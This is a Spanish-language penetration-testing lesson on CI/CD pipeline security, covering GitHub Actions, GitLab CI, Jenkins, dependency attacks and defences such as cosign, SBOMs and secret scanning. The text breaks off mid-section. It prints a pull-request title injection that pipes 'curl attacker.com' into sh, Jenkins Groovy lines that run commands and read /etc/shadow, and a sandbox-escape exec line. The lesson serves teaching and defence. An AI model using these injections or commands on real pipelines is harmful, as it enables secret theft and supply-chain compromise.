# Lección 06 — CI/CD Pipeline Security

Módulo 04: Containers and Software Architecture · Penetration Testing with Kali Linux 1.0 · Red Team Leaders

## Introducción

Los pipelines de integración continua y entrega continua son el corazón de la entrega de software moderna. Cada push a un repositorio dispara un runner en algún sitio que clona código, instala dependencias, construye artefactos, corre tests, firma releases y empuja a producción. Ese runner tiene credenciales —claves cloud, tokens de registry, claves SSH, contraseñas de base de datos— y corre como alguna forma de principal privilegiado en cada cambio de código. Compromete ese runner, o la definición de workflow que consume, y no solo posees el repositorio actual: posees cada sistema downstream que confía en su salida.

Los pipelines de CI/CD atraen a los atacantes por tres razones. Primera: están automatizados. Un solo commit malicioso puede ejecutarse en decenas de runners en minutos, sin revisión humana. Segunda: guardan secrets por diseño. Todo el propósito de un sistema de build es tener credenciales de los sistemas a los que despliega. Tercera: su salida la confían de forma implícita los consumidores downstream. Un paquete construido por tu pipeline y empujado a tu registry lo instalan miles de servidores sin más inspección. El compromiso de SolarWinds Orion (2020), la brecha del Bash Uploader de Codecov (CVE-2021-32471), la dependency confusion del nightly de PyTorch (2022) y la reescritura de tj-actions/changed-files (CVE-2025-30066) se apoyan todos en esta asimetría de confianza.

Esta lección disecciona los pipelines de CI/CD desde la perspectiva de un pentester. Vamos a recorrer los workflows paso a paso, mostrar dónde se acumulan los secrets, explotar la inyección de script clásica de `pull_request_target` contra un repositorio de laboratorio, secuestrar un runner self-hosted y pivotar desde un `GITHUB_TOKEN` filtrado hacia una rama `main` envenenada. Vamos a mirar GitLab CI, Groovy de Jenkins y los runners SaaS más pequeños, y cerrar con el stack defensivo —commits firmados, SBOM, attestations de in-toto y cosign— que sube el coste de estos ataques.

## 1. Introducción: los runners corren como admin en algún sitio

El modelo mental más importante para la seguridad de CI/CD es este: cada job del pipeline es ejecución de código en infraestructura que ya tiene privilegio. El runner puede ser un contenedor en la flota de GitHub, una instancia EC2 en tu VPC, un servidor bare-metal en un rack de colocation o un portátil debajo del escritorio de alguien. Dondequiera que viva, tiene dos categorías de privilegio:

- **Privilegio ambiente:** alcanzabilidad de red, acceso a instance metadata, rol IAM pegado al host, capacidad de escribir en sistemas de archivos o cachés compartidos.
- **Privilegio inyectado:** secrets ligados al entorno del job: credenciales de registry, claves cloud, `GITHUB_TOKEN`, claves SSH de despliegue, certificados de firma de código.

Si un workflow está definido en un archivo dentro del repositorio, entonces quien pueda modificar ese archivo puede ejecutar código arbitrario con ambas categorías de privilegio. Todo el juego se reduce a esto: quién puede modificar el workflow, o suministrar la entrada que el workflow interpola de forma insegura en una shell.

```text
┌────────────────────────────────────────────────────────────────┐
│  Objetivo del atacante                                         │
├────────────────────────────────────────────────────────────────┤
│  1. Conseguir ejecución de código en un runner                 │
│  2. Robar credenciales ambiente (IMDS, secrets montados)       │
│  3. Exfiltrar los secrets inyectados desde el entorno          │
│  4. Envenenar un artefacto que los consumidores downstream     │
│     van a descargar                                            │
│  5. Persistir modificando ramas protegidas o escribiendo       │
│     workflows nuevos                                           │
└────────────────────────────────────────────────────────────────┘
```

Cada una de las secciones de abajo es una variación del mismo árbol de ataque.

## 2. Anatomía del pipeline: dónde viven los secrets en cada paso

Un pipeline de CI/CD es un grafo de jobs, pero a gran escala todo pipeline recorre las mismas fases. Entender qué credenciales aparecen en qué fase te dice dónde cazar.

### 2.1 El pipeline de seis fases

```text
┌────────┐   ┌───────┐   ┌──────┐   ┌─────────┐   ┌─────────┐   ┌────────┐
│ Source │ → │ Build │ → │ Test │ → │ Package │ → │ Publish │ → │ Deploy │
└────────┘   └───────┘   └──────┘   └─────────┘   └─────────┘   └────────┘
   Git         Compile     Unit,     Container,     Registry     SSH,
   token       cache       integ,    tarball,       push,        kubectl,
   SSH         proxy       fuzz      SBOM           sign         Helm,
   deploy      creds                                 keys         cloud IAM
   key
```

### 2.2 Secrets por fase

| Fase | Secrets típicos | Dónde se filtran |
| --- | --- | --- |
| Source | Git PAT, deploy key, socket del agente SSH | `git config --get`, `.git/config`, agent forwarding |
| Build | Credenciales del proxy de paquetes (Artifactory, Nexus), auth del registry privado | `~/.npmrc`, `~/.pip/pip.conf`, `~/.m2/settings.xml`, logs de build |
| Test | URLs de la base de datos de test, API keys de staging, fixtures sembrados | Salida de tests, JUnit XML, informes de cobertura subidos como artefactos |
| Package | Claves de firma GPG, claves privadas de cosign, certificados de codesign | Archivos efímeros en `/tmp`, `~/.gnupg`, desbloqueo del llavero |
| Publish | Tokens de push al registry, auth de npm, token de API de PyPI, PAT de Docker Hub | Variables de entorno, `~/.docker/config.json`, logs del workflow cuando falla |
| Deploy | IAM cloud (access key de AWS, JSON de service account de GCP, SP de Azure), kubeconfig, credenciales del repo de charts de Helm | Variables de entorno, archivos montados, `kubectl config`, CLIs del proveedor cloud |

### 2.3 Antipatrones habituales

- Pasar secrets como argumentos de línea de comandos (visibles en `ps` y en los logs de procesos).
- `echo $SECRET` para depurar (el enmascarado es best-effort; base64 lo derrota de forma trivial).
- Subir archivos `.env` como artefactos de build.
- Persistir el workspace del runner entre jobs, de modo que las credenciales sobrantes sobrevivan.
- Usar el mismo rol cloud de ámbito amplio para build y para deploy.

## 3. GitHub Actions en profundidad

GitHub Actions se ha convertido en el sistema de CI/CD dominante del código abierto y se usa mucho dentro de las empresas mediante GitHub Enterprise Server. Su poder —y su superficie de riesgo— viene de un lenguaje de expresiones que se interpola en scripts de shell antes de la ejecución.

### 3.1 Sintaxis de workflow

Los workflows viven bajo `.github/workflows/*.yml`. Un workflow mínimo:

```yaml
name: CI
on:
  push:
    branches: [main]
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install
        run: npm ci
      - name: Test
        run: npm test
```

### 3.2 Triggers que importan para la seguridad

| Trigger | ¿Corre en pull requests de forks? | ¿Tiene secrets? | ¿Usa código del fork? |
| --- | --- | --- | --- |
| `push` | No | Sí | N/A |
| `pull_request` | Sí | No (token de solo lectura) | Sí |
| `pull_request_target` | Sí | Sí (secrets completos) | Corre el código del repo base, pero el contexto del evento lo controla el fork |
| `workflow_run` | Después de otro workflow | Sí | Cuidado: puede heredar entradas del fork |
| `issue_comment` | Sí | Sí | El cuerpo del comentario lo controla el atacante |
| `workflow_dispatch` | Manual | Sí | Entradas de quien llama |

El trigger `pull_request_target` es el más peligroso por diseño. Existe para que los maintainers puedan etiquetar pull requests, correr comprobaciones de contribuidores primerizos y añadir comentarios: acciones que necesitan acceso de escritura al repositorio base. Pero, como concede secrets a un workflow que procesa entradas controladas por el fork, es el origen de la clase más productiva de vulnerabilidades de Actions.

### 3.3 Runners: hospedados por GitHub frente a self-hosted

- Los runners hospedados por GitHub son VMs efímeras. Cada job recibe un entorno limpio; la VM se destruye al terminar el job. El compromiso termina con el job.
- Los runners self-hosted son de larga vida. El servicio del runner hace polling a GitHub en busca de jobs y los ejecuta en tu infraestructura. El compromiso significa acceso persistente a tu red. La propia documentación de GitHub advierte contra enganchar runners self-hosted a repositorios públicos.

### 3.4 Contextos de expresiones

Las expresiones de Actions tienen la forma `${{ <context>.<field> }}`. Se evalúan antes de que la shell las vea: la cadena se sustituye tal cual en el script `run:`.

```yaml
- name: Say hello
  run: echo "Hello ${{ github.event.pull_request.title }}"
```

Si el título del pull request es `foo"; curl attacker.com | sh; #`, el runner ejecuta:

```bash
echo "Hello foo"; curl attacker.com | sh; #"
```

Esto es inyección de script, y es la clase de vulnerabilidad de Actions más común. El Security Lab de GitHub ha publicado decenas de writeups; el patrón sigue prevaleciendo en 2026.

### 3.5 GITHUB_TOKEN y permisos

Cada ejecución de workflow recibe un `GITHUB_TOKEN` efímero con ámbito del repositorio. Antes de 2023, por defecto tenía acceso de escritura completo en muchos repositorios. Los valores por defecto modernos son de solo lectura, pero muchos workflows viejos siguen declarando ámbitos más amplios:

```yaml
permissions:
  contents: write
  packages: write
  id-token: write
```

El ámbito `id-token: write` es significativo: habilita el intercambio OIDC con proveedores cloud, lo que significa que el workflow puede acuñar credenciales de corta vida de AWS/GCP/Azure sin que se guarde ningún secret de larga vida. Compromete un workflow con `id-token: write` y una trust policy que lo acepte, y obtienes credenciales cloud bajo demanda.

## 4. Ataque: inyección de script en pull_request_target

Este es el ataque canónico de CI/CD. Funciona en cualquier workflow que combine tres ingredientes:

- `on: pull_request_target` (o `workflow_run` encadenado después de `pull_request`).
- Un paso `run:` que interpola una expresión controlada por el fork (`github.event.pull_request.title`, `github.head_ref`, `github.event.pull_request.body`, nombres de labels del pull request, cuerpos de comentarios de review).
- Secrets, o un token con ámbito de escritura, en alcance.

### 4.1 Workflow vulnerable

```yaml
name: PR Greeter
on:
  pull_request_target:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Post greeting
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "Welcome, thanks for the PR titled: ${{ github.event.pull_request.title }}"
          gh api "/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
            -f body="Thanks for your PR!"
```

### 4.2 Impacto

Quien abre el pull request controla el título. Esa cadena se interpola dentro del script del job, así que cierra la comilla y ejecuta un comando en el mismo entorno que ya tiene `GH_TOKEN`. El payload no se incluye.

Ejemplos reales que encajan con este patrón incluyen el writeup del Security Lab de GitHub sobre tj-actions/changed-files (CVE-2025-30066, marzo de 2025), donde la action comprometida empujó un paso malicioso a cada workflow que la usaba, y el writeup de 2022 de Adnan Khan sobre Chrome for Testing.

### 4.3 Detección en el mundo real

```bash
# Grep de una org clonada en busca del patrón:
grep -rE 'pull_request_target|workflow_run' .github/workflows/
grep -rE '\$\{\{\s*github\.event\.(pull_request\.(title|body|head\.ref)|issue\.title|comment\.body)\s*\}\}' \
     .github/workflows/
```

Herramientas como zizmor y actionlint cazan el patrón de forma estática.

## 5. Ataque: toma de un runner self-hosted

Un runner self-hosted enganchado a un repositorio público es una invitación permanente. Cualquiera que pueda abrir un pull request puede ejecutar código en él. Incluso en repositorios privados, un contribuidor comprometido o un repositorio con protección de ramas laxa proporciona la misma primitiva.

### 5.1 El ataque

El repositorio objetivo tiene:

```yaml
on: [pull_request]
jobs:
  build:
    runs-on: [self-hosted, linux, x64]
    steps:
      - uses: actions/checkout@v4
      - run: make test
```

Si los maintainers hacen merge, o si el workflow usa `pull_request` (no `_target`) sobre un runner self-hosted, el código del fork corre en la infraestructura del maintainer. Desde ese runner se alcanzan los ficheros de otros jobs, el material de registro del runner, el Instance Metadata Service del cloud y el entorno de un job posterior de deploy. El procedimiento no se incluye.

### 5.2 Las recomendaciones de GitHub frente a la realidad

GitHub recomienda de forma explícita no usar runners self-hosted en repos públicos. En la práctica, miles de organizaciones hacen exactamente eso. La investigación de Praetorian de 2023 sobre runners de GitHub Actions documentó una exposición generalizada en grandes proyectos de código abierto. En 2024, el escáner Gato-X de Adnan Khan catalogó cientos de tomas de runners self-hosted en repositorios públicos.

### 5.3 Endurecer runners self-hosted

- Usa runners efímeros (flag `--ephemeral`) para que cada job reciba un registro fresco y el runner se desregistre después de un job.
- Corre el runner dentro de un contenedor sin privilegios, sin socket del host, sin flag privileged y con un network namespace dedicado.
- Engancha el runner solo a nivel de repositorio, nunca a nivel de organización con acceso en pool.
- Haz cumplir *Require approval for all outside collaborators* y no dejes que los contribuidores primerizos disparen workflows.
- Usa grupos de runners con ámbito a repositorios concretos.

## 6. Ataque: GITHUB_TOKEN filtrado con contents: write

Cualquier inyección o bug de lógica que permita a un atacante exfiltrar el `GITHUB_TOKEN` del job es un evento serio. Si el token tiene `contents: write`, el atacante puede reescribir el repositorio, incluidas las ramas protegidas, sujeto a los ajustes de branch protection que muchos repos dejan permisivos.

### 6.1 Qué permite el token

Con `contents: write` en el `GITHUB_TOKEN`, un push directo a `main` reescribe el repositorio. Si la branch protection exige commits firmados o review de pull request, ese push falla. Aun así el token puede:

- Crear una rama nueva y abrir un pull request (saltándose el requisito de un autor humano en el commit).
- Hacer push de un tag nuevo en el que confíe la automatización de releases.
- Crear un release, subiendo un binario envenenado.
- Modificar `.github/workflows/*.yml` para desactivar protecciones en la ejecución siguiente.

### 6.2 Casos reales

- CVE-2025-30066 (tj-actions/changed-files): un atacante comprometió los tags de release de la action y reescribió la historia para inyectar un payload que volcaba la memoria del proceso (con `GITHUB_TOKEN` y otros secrets) a los logs del workflow. Decenas de miles de workflows downstream filtraron secrets en cuestión de horas.
- CVE-2024-27351 / GHSA-6phf-73q6-gh87 y avisos relacionados de inyección en workflows que afectaron a actions populares a lo largo de 2024.
- Bash Uploader de Codecov (abril de 2021): el atacante alteró el script del uploader; cada CI que lo entubaba a bash filtraba variables de entorno, incluidos tokens del sistema de CI.

### 6.3 Defensa

```yaml
permissions:
  contents: read      # niega escrituras al principio del workflow
  pull-requests: write  # concede solo lo que necesitas, por job
```

Pon el valor por defecto del repositorio en solo lectura en Settings → Actions → General → Workflow permissions.

## 7. GitLab CI

GitLab CI se define en `.gitlab-ci.yml` en la raíz del repositorio. El modelo de runner es parecido en estructura, pero las primitivas de seguridad difieren.

### 7.1 Pipeline mínimo

```yaml
stages:
  - build
  - test
  - deploy

variables:
  DOCKER_DRIVER: overlay2

build:
  stage: build
  image: node:20-alpine
  script:
    - npm ci
    - npm run build
  artifacts:
    paths:
      - dist/

test:
  stage: test
  image: node:20-alpine
  needs: [build]
  script:
    - npm test

deploy_prod:
  stage: deploy
  image: alpine:3.19
  needs: [test]
  only:
    - main
  script:
    - apk add --no-cache curl
    - curl -H "Authorization: Bearer $DEPLOY_TOKEN" -X POST https://deploy.example/hook
  environment:
    name: production
```

### 7.2 CI_JOB_TOKEN y variables protegidas

Cada job de GitLab CI recibe `CI_JOB_TOKEN`. Históricamente era casi inútil; desde GitLab 15+ se puede acotar para conceder lectura/escritura a proyectos concretos. Una mala configuración aquí es el análogo en GitLab del scope creep de `GITHUB_TOKEN`.

Las variables se pueden marcar como Protected (solo se exponen en ramas o tags protegidos) y Masked (se redactan en los logs del job). Ambas hay que ponerlas de forma explícita.

### 7.3 Runners

- Los shared runners de gitlab.com corren en VMs efímeras.
- Los group runners se enganchan a un grupo y se reutilizan entre muchos proyectos: el compromiso del job de un proyecto puede atacar el estado del runner y afectar a los vecinos.
- Los specific runners se enganchan a un solo proyecto.

Los runners Docker-in-Docker con `privileged = true` son una mala configuración habitual. Un job malicioso de `.gitlab-ci.yml` puede salir del contenedor.

### 7.4 Superficie de ataque específica de GitLab

- `include: remote`: un `.gitlab-ci.yml` que incluye YAML desde una URL remota ejecuta lo que esa URL sirva en ese momento.
- Los pipelines de merge request (`workflow: rules: - if: '$CI_MERGE_REQUEST_ID'`) pueden correr código del fork con variables del proyecto padre si la protección de ramas está mal configurada.
- Auto DevOps: la plantilla de pipeline integrada trae un conjunto amplio de permisos por defecto.

## 8. Jenkins

Jenkins sigue siendo el sistema de CI on-prem más desplegado y es un objetivo perenne. Su arquitectura —un controller con agents, ejecución dirigida por plugins y un lenguaje de pipeline escrito en Groovy— ofrece muchas primitivas de RCE.

### 8.1 Classic (Freestyle) frente a Pipeline

Los jobs Freestyle se configuran por la UI y guardan bloques de shell y configuraciones de SCM. Los jobs Pipeline son código, ya sea en un `Jenkinsfile` del repositorio o en un script Groovy de la configuración del job.

```groovy
pipeline {
  agent { label 'linux' }
  stages {
    stage('Build') {
      steps {
        sh 'make build'
      }
    }
    stage('Deploy') {
      when { branch 'main' }
      steps {
        withCredentials([string(credentialsId: 'prod-key', variable: 'PROD_KEY')]) {
          sh 'deploy.sh $PROD_KEY'
        }
      }
    }
  }
}
```

### 8.2 Script Console: RCE trivial

`http://<jenkins>/script` es la consola de script Groovy. Quien tenga Overall/Administer —o un token que lo tenga— puede ejecutar Groovy arbitrario en la JVM del controller:

```groovy
"id".execute().text
new File("/etc/shadow").text
Jenkins.instance.getAllItems().each { println it.name }
```

El compromiso masivo histórico de servidores Jenkins expuestos a internet fue, de forma abrumadora, vía acceso sin autenticar o con auth débil a `/script`, `/manage`, `/scriptText` y `/computer/(built-in)/api/`.

### 8.3 CVE destacadas

- CVE-2024-23897: lectura arbitraria de archivos en la CLI de Jenkins mediante `expandAtFiles`. Leer `secrets/master.key` y `secrets/hudson.util.Secret` permite a un atacante descifrar cada credencial almacenada.
- CVE-2018-1000861: RCE pre-auth mediante metaprogramación de Stapler/Groovy.
- CVE-2017-1000353: RCE por deserialización en la CLI.

### 8.4 Escapes del sandbox de Groovy

El plugin Script Security aísla en un sandbox el Groovy no confiable de los Jenkinsfiles. Históricamente se han reportado decenas de escapes del sandbox (CVE-2019-1003029, CVE-2019-1003030 y muchos avisos SECURITY-*). Un patrón:

```groovy
// Este fue un escape histórico del sandbox mediante metaprogramación
this.class.classLoader.loadClass('Runtime').getRuntime().exec('id')
```

Cada escape exige que un admin haya aprobado un script o que el sandbox esté mal configurado. En una evaluación, revisa siempre Manage Jenkins → In-process Script Approval en busca de firmas peligrosas pendientes o aprobadas en el pasado.

## 9. CircleCI, Buildkite, Drone: mención breve

- **CircleCI:** `.circleci/config.yml`; los contexts guardan secrets compartidos; los orbs son fragmentos YAML reutilizables (una toma de un orb es el espejo de una toma de una GitHub Action). El propio CircleCI fue vulnerado en diciembre de 2022, cuando se comprometió el portátil de un ingeniero de soporte al cliente y se filtraron variables de entorno y tokens de clientes.
- **Buildkite:** modelo híbrido en el que Buildkite hospeda el plano de coordinación, pero los agents corren en la infraestructura del cliente. El directorio `hooks/` del agent es una primitiva de persistencia; si puedes escribir ahí, cada job posterior corre tu hook.
- **Drone / Woodpecker:** definidos en YAML, nativos de contenedores. Los repositorios trusted se saltan el sandbox de seguridad y conceden `--privileged` a los contenedores del job: un `trusted: true` mal puesto en los ajustes del repo es toma inmediata del host.

El hilo común: lee la documentación del modelo de seguridad del propio CI antes de evaluar. Cada uno tiene uno o dos interruptores concretos del tipo «si pones este flag, la seguridad está apagada».

## 10. Ataques a la cadena de suministro de dependencias

El runner no es la única superficie de ataque. Cada dependencia que el build descarga es potencialmente controlada por el atacante.

### 10.1 Dependency confusion

La investigación de Alex Birsan de 2021 demostró que muchas organizaciones configuran los gestores de paquetes para caer al registry público cuando el privado no contiene el nombre pedido. Publicar un paquete público con el mismo nombre que uno interno hace que el build descargue la versión del atacante.

```bash
# La víctima usa un paquete interno "internal-utils"
# El atacante publica internal-utils en npmjs.com con una versión más alta
npm publish   # desde el package.json del atacante, que declara version 99.0.0

# El build de la víctima corre `npm install` y tira del 99.0.0 público
# porque el registry interno solo tiene 1.2.3
```

Mitigación: paquetes con scope, `.npmrc`/`.pip.conf` explícitos que fijen el registry por scope, y denegar el fallback público.

### 10.2 Typosquatting

Publicar `reqeusts`, `python-sqlite`, `colorss`, `lodahs` y esperar que los desarrolladores se equivoquen al teclear. Sonatype y Snyk publican informes trimestrales; cada mes se retiran cientos de typosquats maliciosos de npm y de PyPI.

### 10.3 Actualizaciones maliciosas de paquetes legítimos

- **event-stream (2018):** un maintainer entregó el paquete a un nuevo «ayudante», que añadió `flatmap-stream` como dependencia. La dependencia robaba claves de wallets de Bitcoin a los usuarios de Copay. Millones de descargas estimadas antes de la retirada.
- **ua-parser-js (octubre de 2021):** CVE-2021-42740 y el aviso de seguridad de NPM asociado. Una cuenta de maintainer secuestrada publicó las versiones 0.7.29, 0.8.0 y 1.0.0 con un minero de monedas y un robador de credenciales dirigido a Windows y Linux.
- **colors.js y faker.js (enero de 2022):** el maintainer saboteó a propósito sus propios paquetes con un bucle infinito, y rompió miles de builds downstream.
- **xz-utils (CVE-2024-3094, marzo de 2024):** una campaña de ingeniería social de varios años insertó una puerta trasera en la librería de compresión, que recogieron las distribuciones Linux y que habría llegado a producción de no ser por el descubrimiento fortuito de Andres Freund.
- **PyTorch nightly (diciembre de 2022):** dependency confusion sobre el paquete `torchtriton`, publicado de forma maliciosa en PyPI mientras el nightly de PyTorch tiraba de PyPI por defecto.

### 10.4 Defensa

- Lockfiles (`package-lock.json`, `poetry.lock`, `Cargo.lock`) con hashes de integridad.
- Mirrors privados (Artifactory, Nexus, Verdaccio) que revisen las publicaciones.
- Listas de permitidos de paquetes aprobados.
- Escaneo automatizado: Socket, Snyk, Sonatype, `npm audit`, `pip-audit`.

## 11. Ataques de clase SolarWinds: servidores de build envenenados

El compromiso de SolarWinds Orion (divulgación pública en diciembre de 2020, seguido como SUNBURST/UNC2452) es el ataque canónico moderno a la cadena de suministro. El servidor de build fue comprometido; se insertó código malicioso en silencio durante la compilación; el artefacto resultante se firmó con el certificado legítimo de firma de código de SolarWinds y se envió a unos 18.000 clientes.

### 11.1 El patrón de ataque

```text
1. El atacante compromete credenciales de un desarrollador o de un build-agent.
2. El atacante planta un hook malicioso en tiempo de build (plugin del compilador,
   script pre-build, herramienta "helper" llamada durante MSBuild).
3. Los desarrolladores legítimos commitean código fuente legítimo.
4. El servidor de build compila el fuente. El hook inyecta objetos
   maliciosos en la salida en tiempo de enlace.
5. El servidor de build firma el artefacto con la clave de firma real.
6. El artefacto es indistinguible de una salida legítima a nivel de
   código fuente: el código malicioso solo existe después del enlace.
7. Los consumidores downstream instalan y confían en el artefacto firmado.
```

La idea crítica es que revisar el código fuente no detecta esto. Hay que auditar el propio entorno de build y verificar la reproducibilidad.

### 11.2 Detección y defensa

- **Builds reproducibles:** la misma entrada de código fuente produce siempre una salida idéntica byte a byte. Cualquier deriva es una bandera roja. El proyecto Reproducible Builds de Debian empuja esto desde 2013.
- **Builds herméticos:** sin acceso a la red durante el build; todas las entradas se materializan de antemano. Bazel y Nix lo hacen cumplir.
- **Attestation de build de dos personas:** dos builders independientes tienen que producir el mismo hash de artefacto antes de firmar.
- **Aislamiento del entorno de build:** la clave de firma nunca toca el entorno de build de propósito general. Un firmante separado recibe el hash del artefacto y devuelve una firma.

### 11.3 Incidentes comparables

- **CCleaner (2017):** el servidor de build de Piriform fue comprometido; dos versiones maliciosas llegaron a más de 2 millones de usuarios.
- **NotPetya (2017):** el servidor de actualizaciones del software de contabilidad ucraniano M.E.Doc fue secuestrado para distribuir el wiper.
- **3CX (marzo de 2023):** cadena de suministro en cascada: el compromiso de X_TRADER de Trading Technologies (producto retirado) llevó a un desarrollador de 3CX comprometido, que llevó a actualizaciones maliciosas de 3CX Desktop App.

## 12. Cadena de suministro de imágenes de contenedor

Hacer `FROM docker.io/library/nginx:latest` en tu Dockerfile es confiar en quien controla ese tag ahora y en el futuro. Los tags son mutables; los digests no.

### 12.1 La cadena de confianza

```dockerfile
FROM node:20-alpine
```

Esto confía en:

- La infraestructura de registry de Docker Hub.
- El valor actual del tag `node:20-alpine` (que cambia con el tiempo).
- El pipeline de los maintainers de las imágenes Docker de Node.js que lo publica.
- La imagen base de los maintainers de Alpine.
- Los binarios de cada capa.

### 12.2 Fijar a digests

```dockerfile
FROM node:20-alpine@sha256:2d07db07a2df6830718ae2a47db6fedce6745f5bcd174c398f2acdda90a01c00
```

El digest está direccionado por contenido. Si la imagen que hay detrás del tag se republica de forma maliciosa, el pin sigue resolviendo a los bytes originales.

### 12.3 Firma de imágenes con cosign

cosign, de Sigstore, firma artefactos OCI usando claves estáticas o certificados de corta vida derivados de OIDC y emitidos por Fulcio:

```bash
# Firma sin clave, usando la identidad OIDC de GitHub Actions
cosign sign --yes ghcr.io/example/app@sha256:abc...

# Verifica
cosign verify \
  --certificate-identity 'https://github.com/example/app/.github/workflows/release.yml@refs/tags/v1.2.3' \
  --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
  ghcr.io/example/app@sha256:abc...
```

El tooling de despliegue (Kyverno, Sigstore Policy Controller, Connaisseur) puede hacer cumplir que solo se admitan en el clúster imágenes firmadas por una identidad de confianza.

### 12.4 Niveles SLSA

El framework Supply-chain Levels for Software Artifacts (SLSA, se pronuncia «salsa») define cuatro niveles de integridad de build. A partir de SLSA v1.0:

- **Build L1:** existe la provenance y describe cómo se construyó el artefacto.
- **Build L2:** la provenance la genera una plataforma de build hospedada y está firmada digitalmente.
- **Build L3:** la plataforma de build se endurece contra la manipulación, aísla los builds e impide la exfiltración de secrets.

GitHub Actions con `slsa-framework/slsa-github-generator` alcanza L3 para muchas formas de workflow.

## 13. Gestión de secrets

El patrón malo de secrets es este: meter secrets en archivos env, cifrarlos en reposo con una clave compartida del equipo y descifrarlos a variables de entorno al empezar el job. El patrón correcto es este: traer secrets de corta vida en el momento de usarlos, no registrar nada y rotar con frecuencia.

### 13.1 Almacenes de secrets gestionados

- **HashiCorp Vault:** soporta secrets dinámicos (credenciales de base de datos por petición que expiran en minutos), cifrado en tránsito y emisión de PKI. Los métodos de auth incluyen AppRole, JWT (para OIDC de CI) e IAM cloud.
- **AWS Secrets Manager / SSM Parameter Store:** se recuperan mediante un rol IAM. Combínalo con la federación OIDC de GitHub Actions para evitar cualquier clave de AWS de larga vida.
- **GCP Secret Manager, Azure Key Vault:** análogos.
- **Secrets de GitHub Actions:** cifrados en reposo, descifrados en el entorno del job. Sirven para tokens que autentican contra otro almacén de secrets, no para secrets de larga vida que sean las joyas de la corona.
- **Doppler, Infisical, 1Password Secrets Automation:** SaaS de terceros.

### 13.2 Acceso a secrets de GitHub Actions

```yaml
- name: Deploy
  env:
    API_KEY: ${{ secrets.PROD_API_KEY }}
  run: ./deploy.sh
```

Reglas de acceso:

- Los secrets no se pasan a workflows disparados desde forks (un `pull_request` de un fork ve valores vacíos).
- Los secrets se enmascaran en los logs: el enmascarado es un reemplazo de subcadena, y lo derrota cualquier transformación.
- Los secrets con ámbito de environment (`environments/prod`) pueden exigir la aprobación de un revisor antes de que corra el job.

### 13.3 Caminos de filtración

```yaml
# MAL: hacer echo de un secret. El enmascarador de GitHub puede reemplazarlo,
# pero base64 o las cadenas invertidas se saltan el enmascarado.
- run: echo "$PROD_API_KEY" | base64

# MAL: set -x imprime cada comando con las variables expandidas
- run: |
    set -x
    curl -H "Authorization: Bearer $TOKEN" ...

# MAL: escribir secrets en artefactos
- run: env > env.txt
- uses: actions/upload-artifact@v4
  with:
    path: env.txt

# MAL: pasarlos en la línea de comandos: visibles en ps y en los audit logs
- run: mytool --api-key=$API_KEY
```

### 13.4 Patrones preferidos

- Usa federación OIDC para el acceso cloud (`aws-actions/configure-aws-credentials` con `role-to-assume` e `id-token: write`).
- Prefiere la inyección de secrets basada en archivo (`--credential-file`) frente a las variables de entorno.
- Usa `add-mask::` para enmascarar cualquier valor sensible calculado de forma dinámica.
- Rota según un calendario y ante cada exposición sospechada.

## 14. Tooling de escaneo de secrets

Escanear la historia y el código actual en busca de secrets es lo mínimo. Da por hecho que cada repo que toques ha filtrado secrets en la historia hasta que se demuestre lo contrario.

### 14.1 gitleaks

```bash
# Escanea el árbol de trabajo actual
gitleaks detect --source . --verbose

# Escanea toda la historia de git
gitleaks detect --source . --log-opts="--all"

# Escanea un rango de commits concreto
gitleaks detect --source . --log-opts="main..feature-branch"

# Reglas a medida
gitleaks detect --config .gitleaks.toml
```

### 14.2 trufflehog

```bash
# Escanea una org de GitHub, verificando secrets contra APIs vivas
trufflehog github --org=victim --only-verified

# Escanea la historia completa de un repo
trufflehog git file://. --only-verified

# Escanea las capas de una imagen Docker
trufflehog docker --image=nginx:latest
```

Lo que diferencia a Trufflehog es la verificación: intenta usar cada secret detectado contra la API correspondiente para confirmar que está vivo. Eso reduce de forma drástica los falsos positivos.

### 14.3 GitHub Secret Scanning

GitHub escanea de forma nativa los repos públicos y, para los clientes de GitHub Advanced Security, los repos privados. Los escáneres integrados con partners avisan de inmediato al emisor del token (AWS, Stripe, Slack, etc.), que puede revocarlo automáticamente.

### 14.4 Otros

- **detect-secrets (Yelp):** dirigido por baseline, bueno para una puerta de CI.
- **git-secrets (AWS Labs):** hook de pre-commit.
- **git-secret de Cloudflare:** proyecto distinto; cifra secrets con GPG para guardarlos en git.
- **Nosey Parker (Praetorian):** escáner de alto rendimiento afinado para codebases grandes.

### 14.5 Rotación después de una filtración

Un secret filtrado está comprometido aunque no se observe explotación. Rótalo de inmediato. Limpiar la historia con `git filter-repo` no ayuda si el commit llegó a hacer push alguna vez: mirrors públicos, forks y clones pueden conservarlo.

## 15. SBOM y provenance

Un Software Bill of Materials (SBOM) es una lista legible por máquina de todo lo que hay en un artefacto: dependencias directas, dependencias transitivas, versiones, licencias, hashes.

### 15.1 Generar SBOM con syft

```bash
# Genera SPDX JSON a partir de una imagen de contenedor
syft ghcr.io/example/app:1.2.3 -o spdx-json > sbom.spdx.json

# Genera CycloneDX a partir de un directorio de código fuente
syft dir:. -o cyclonedx-json > sbom.cdx.json

# Adjúntalo a una imagen como referrer OCI
syft ghcr.io/example/app:1.2.3 -o cyclonedx-json | \
  cosign attest --predicate - --type cyclonedx ghcr.io/example/app@sha256:...
```

### 15.2 Escaneo de vulnerabilidades a partir de un SBOM

```bash
grype sbom:./sbom.spdx.json
# O escanea la imagen directamente
grype ghcr.io/example/app:1.2.3
```

### 15.3 Attestations de in-toto

in-toto es un framework para seguir los pasos de un pipeline de build, cada uno atestiguado por la entidad que lo realiza:

```bash
# Atestigua que este artefacto lo construyó este workflow a partir de este commit
cosign attest --predicate provenance.json \
  --type slsaprovenance \
  ghcr.io/example/app@sha256:...
```

`slsa-github-generator` produce provenance conforme a SLSA de forma automática.

### 15.4 Verificar en el momento del deploy

```bash
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp '^https://github.com/example/app/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/example/app@sha256:...
```

## 16. Commits firmados y tags firmados

Firmar commits no impide que se commitee código malicioso. Prueba quién lo commiteó, y eso importa para la rendición de cuentas y para revocar la confianza después de un compromiso.

### 16.1 Commits firmados con GPG

```bash
# Configura
git config --global user.signingkey <keyid>
git config --global commit.gpgsign true
git config --global tag.gpgsign true

# Firma un commit concreto
